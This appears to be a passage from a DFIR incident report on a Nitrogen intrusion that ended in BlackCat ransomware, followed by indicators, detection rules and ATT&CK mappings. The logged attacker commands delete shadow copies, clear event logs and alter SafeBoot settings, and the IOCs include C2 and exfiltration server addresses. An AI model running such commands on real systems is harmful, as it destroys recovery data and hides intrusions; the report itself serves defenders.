--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "C:\example.exe --safeboot-instance --access-token REDACTED --prop-arg-safeboot-network "
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "C:\Windows\TEMP\2-REDACTED-51.exe --safeboot-instance --access-token REDACTED --prop-arg-safeboot-network --prop-file \"C:\example.exe\""
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\15991160457623399845550968347370640942 /f"
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\15991160457623399845550968347370640942 /f"
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "sc delete 15991160457623399845550968347370640942"
--------&gt; C:\Windows\System32\cmd.exe "cmd" /c "bcdedit /deletevalue {current} safeboot"
------------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "wmic csproduct get UUID"
------------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "iisreset.exe /stop"
------------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f"
------------&gt; C:\Windows\System32\cmd.exe "cmd" /c "vssadmin.exe Delete Shadows /all /quiet"
------------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "arp -a"
------------&gt; C:\Windows\System32\cmd.exe "cmd" /c "wmic.exe Shadowcopy Delete"
------------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "wevtutil.exe el"
------------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "wevtutil.exe cl &lt;MULTIPLE EVENT LOGS&gt; (Executed hundreds of times)
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The threat actor executed the binary example.exe which configured the ransomware, cleared logs and deleted volume shadow copies.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38776" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_055.png" alt="" width="942" height="1496" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_055.png 942w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_055-189x300.png 189w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_055-645x1024.png 645w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_055-768x1220.png 768w" sizes="(max-width: 942px) 100vw, 942px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The ransomware options were dissected in <a href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack" target="_blank" rel="noreferrer noopener">Netscope&#8217;s BlackCat Ransomware: Tactics and Techniques From a Targeted Attack</a> blog post.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Upon the execution of these utilities, the binary started encrypting files and dropping the ransom note:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38775" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_056.png" alt="" width="1363" height="917" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_056.png 1363w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_056-300x202.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_056-1024x689.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_056-768x517.png 768w" sizes="(max-width: 1363px) 100vw, 1363px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38830" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1.png" alt="" width="3966" height="7580" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1.png 3966w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1-157x300.png 157w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1-536x1024.png 536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1-768x1468.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1-804x1536.png 804w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_057_1-1072x2048.png 1072w" sizes="(max-width: 3966px) 100vw, 3966px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38774" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_058.png" alt="" width="3506" height="1570" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_058.png 3506w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_058-300x134.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_058-1024x459.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_058-768x344.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_058-1536x688.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_058-2048x917.png 2048w" sizes="(max-width: 3506px) 100vw, 3506px" /></a></p>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Atomic</h3>
<!-- /wp:heading -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Sliver
194.49.94[.]18:8443
194.169.175[.]134:8443

Cobalt Strike
91.92.250[.]60:443
91.92.250[.]65:443

Staging Tool Server
91.92.245[.]26:443

Exfiltration Server
195.123.226[.]84:8000
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Computed</h3>
<!-- /wp:heading -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Version.zip
DBF5F56998705C37076B6CAE5D0BFB4D
E6AB3C595AC703AFD94618D1CA1B8EBCE623B21F
5DC8B08C7E1B11ABF2B6B311CD7E411DB16A7C3827879C6F93BD0DAC7A71D321

wo14.py
EB64862F1C8464CA3D03CF0A4AC608F4
6F43E6388B64998B7AA7411104B955A8949C4C63
726F038C13E4C90976811B462E6D21E10E05F7C11E35331D314C546D91FA6D21

worksliv.py
3A4FDBC642A24A240692F9CA70757E9F
794203A4E18F904F0D244C7B3C2F5126B58F6A21
5F7D438945306BF8A7F35CAB0E2ACC80CDC9295A57798D8165EF6D8B86FBB38D

slv.py
7A4CB8261036F35FD273DA420BF0FD5E
9648559769179677C5B58D5619CA8872F5086312
4EF1009923FC12C2A3127C929E0AA4515C9F4D068737389AFB3464C28CCF5925

work.aes
1BE7FE8E20F8E9FDC6FD6100DCAD38F3
C4CDE794CF4A68D63617458A60BC8B90D99823CA
4EE4E1E2CEDF59A802C01FAE9CCFCFDE3E84764C72E7D95B97992ADDD6EDF527

data.aes
4232C065029EB52D1B4596A08568E800
79818110ABD52BA14800CDFF39ECA3252412B232
3298629DE0489C12E451152E787D294753515855DBF1CE80BFCDED584A84AC62

service_probes
637FB65A1755C4B6DC1E0428E69B634E
FBA4652B6DBE0948D4DADCEBF51737A738CA9E67
B3B1FF7E3D1D4F438E40208464CEBFB641B434F5BF5CF18B7CEC2D189F52C1B6

UpdateEG.bat
0B1882F719504799B3211BF73DFDC253
448892D5607124FDD520F62FF0BC972DF801C046
39EC2834494F384028AD17296F70ED6608808084EF403714CFBC1BFBBED263D4

python311.dll
E20FC97E364E859A2FB58D66BC2A1D05
F5F56413F81E8F4A941F53E42A90BA1720823F15
9514035FEA8000A664799E369AE6D3AF6ABFE8E5CDA23CDAFBEDE83051692E63

example.exe
C737A137B66138371133404C38716741
A3E4FB487400D99E3A9F3523AEAA9AF5CF6E128B
25172A046821BD04E74C15DC180572288C67FDFF474BDB5EB11B76DCE1B3DAD3

2-REDACTED-51.exe
7A1E7F652055C812644AD240C41D904A
B39C244C3117F516CE5844B2A843EFF1E839207C
5FAC60F1E97B6EAAE18EBD8B49B912C86233CF77637590F36AA319651582D3C4

domain_name.exe
E0D1CF0ABD09D7632F79A8259283288D
3A78CE27A7AA16A8230668C644C7DF308DE6CF33
D15CAB3901E9A10AF772A0A1BDBF35B357EE121413D4CF542D96819DC4471158
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Network</h3>
<!-- /wp:heading -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">ETPRO JA3 Hash - Possible Ligolo Server/Golang Binary Response
ET USER_AGENTS Go HTTP Client User-Agent
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET POLICY SMB Executable File Transfer
ET POLICY PsExec service created
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET POLICY Command Shell Activity Over SMB - Possible Lateral Movement
ET POLICY Powershell Activity Over SMB - Likely Lateral Movement
ET POLICY SMB2 NT Create AndX Request For a .bat File
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET INFO Suspected Impacket WMIExec Activity
ET INFO Observed Cloudflare DNS over HTTPS Domain (cloudflare-dns .com in TLS SNI)
ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection
ET HUNTING Terse Unencrypted Request for Google - Likely Connectivity Check
ETPRO USER_AGENTS Observed Suspicious UA (Mozilla/5.0)
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Sigma</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Search rules on <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a> or <a href="https://sigmasearchengine.com/" target="_blank" rel="noreferrer noopener">sigmasearchengine.com</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DFIR Public Rules Repo:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DFIR Private Rules:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">934fa692-f2fa-4465-8bb3-ee1d4c0718cc : Enabling Safeboot with BCDEDIT
181f510b-0b3c-4e05-939c-7623a4a9c82c : Execution of Python Scripts in AppData Directory
6f77de5c-27af-435b-b530-e2d07b77a980 : Impacket Tool Execution
d2722770-3295-478e-bd58-c3c18baaa821 : Modification of UserInit Registry Value
3f684d2e-4760-4db9-a578-3698e21a01d5 : Modification of UserInit Registry Value
2249fc47-1825-4137-b9ce-aa65749bb68c : Restic Backup Tool Misuse
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Sigma Repo:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE
968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity
8d5aca11-22b3-4f22-b7ba-90e60533e1fb : Wmiexec Default Output File
526be59f-a573-4eea-b5f7-f0973207634d : New Process Created Via Wmic.EXE
7cccd811-7ae9-4ebe-9afd-cb5c406b824b : Potential Execution of Sysinternals Tools
42c575ea-e41e-41f1-b248-8093c3e82a28 : PsExec Service Installation
8eef149c-bd26-49f2-9e5a-9b00e3af499b : Pass the Hash Activity 2
192a0330-c20b-4356-90b6-7b7049ae0b8 : Successful Overpass the Hash Attempt
d7662ff6-9e97-4596-a61d-9839e32dee8d : Add SafeBoot Keys Via Reg Utility
cc36992a-4671-4f21-a91d-6c2b72a2edf5 : Suspicious Eventlog Clearing or Configuration Change Activity
c947b146-0abc-4c87-9c64-b17e9d7274a2 : Shadow Copies Deletion Using Operating Systems Utilities
dcd74b95-3f36-4ed9-9598-0490951643aa : PowerView PowerShell Cmdlets - ScriptBlock
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Yara</h3>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/25590/25590.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/25590/25590.yar</a></p>
<!-- /wp:heading -->

<!-- wp:preformatted --><!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>External Rules:</p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://github.com/RussianPanda95/Yara-Rules/blob/main/Nitrogen/mal_nitrogen.yar"} -->
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/RussianPanda95/Yara-Rules/blob/main/Nitrogen/mal_nitrogen.yar">https://github.com/RussianPanda95/Yara-Rules/blob/main/Nitrogen/mal_nitrogen.yar</a></div>
</figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://github.com/RussianPanda95/Yara-Rules/blob/main/Nitrogen/nitrogen_python311.yar"} -->
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/RussianPanda95/Yara-Rules/blob/main/Nitrogen/nitrogen_python311.yar">https://github.com/RussianPanda95/Yara-Rules/blob/main/Nitrogen/nitrogen_python311.yar</a></div>
</figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://github.com/ditekshen/detection/blob/master/yara/malware.yar#L9267-L9289"} -->
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/ditekshen/detection/blob/master/yara/malware.yar#L9267-L9289">https://github.com/ditekshen/detection/blob/master/yara/malware.yar#L9267-L9289</a></div>
</figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_COFFLoader.yar"} -->
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_COFFLoader.yar">https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_COFFLoader.yar</a></div>
<div> </div>
</figure>
<!-- /wp:embed -->

<!-- wp:heading -->
<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE ATT&amp;CK</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38773" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_059.png" alt="" width="1788" height="3254" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_059.png 1788w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_059-165x300.png 165w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_059-563x1024.png 563w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_059-768x1398.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_059-844x1536.png 844w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_059-1125x2048.png 1125w" sizes="(max-width: 1788px) 100vw, 1788px" /></a></p>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Account Manipulation - T1098                                                                                                                                       
Clear Windows Event Logs - T1070.001                                                                                                                               
Data Encrypted for Impact - T1486                                                                                                                                  
Data from Network Shared Drive - T1039                                                                                                                             
DLL Side-Loading - T1574.002                                                                                                                                       
Domain Groups - T1069.002                                                                                                                                          
Domain Trust Discovery - T1482                                                                                                                                     
Drive-by Compromise - T1189                                                                                                                                        
Dynamic-link Library Injection - T1055.001                                                                                                                         
Encrypted/Encoded File - T1027.013                                                                                                                                 
Exfiltration Over Alternative Protocol - T1048                                                                                                                     
Ingress Tool Transfer - T1105                                                                                                                                      
Inhibit System Recovery - T1490                                                                                                                                    
Lateral Tool Transfer - T1570                                                                                                                                      
Local Account - T1087.001                                                                                                                                          
Local Groups - T1069.001                                                                                                                                           
LSASS Memory - T1003.001                                                                                                                                           
Malicious File - T1204.002                                                                                                                                         
Masquerading - T1036                                                                                                                                               
Match Legitimate Name or Location - T1036.005                                                                                                                      
Network Share Discovery - T1135
PowerShell - T1059.001
Process Injection - T1055
Python - T1059.006
Remote Desktop Protocol - T1021.001
Remote System Discovery - T1018
Safe Mode Boot - T1562.009
Scheduled Task - T1053.005
Service Execution - T1569.002
SMB/Windows Admin Shares - T1021.002
Web Protocols - T1071.001
Windows Command Shell - T1059.003
Windows Management Instrumentation - T1047
Winlogon Helper DLL - T1547.004
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Internal case #TB25590 #PR32467</p>
<!-- /wp:paragraph --><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-38756" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-38756" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-38756" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-38756 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2024/08/26/blacksuit-ransomware/" rel="prev">BlackSuit Ransomware</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="1265e6b2da" /><input type="hidden" name="_wp_http_referer" value="/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/" /><input type="hidden" name="post_id" value="38756"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="bc235b954ff2c1b7a3b0088b-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2024\/09\/30\/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware\/":38756};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline 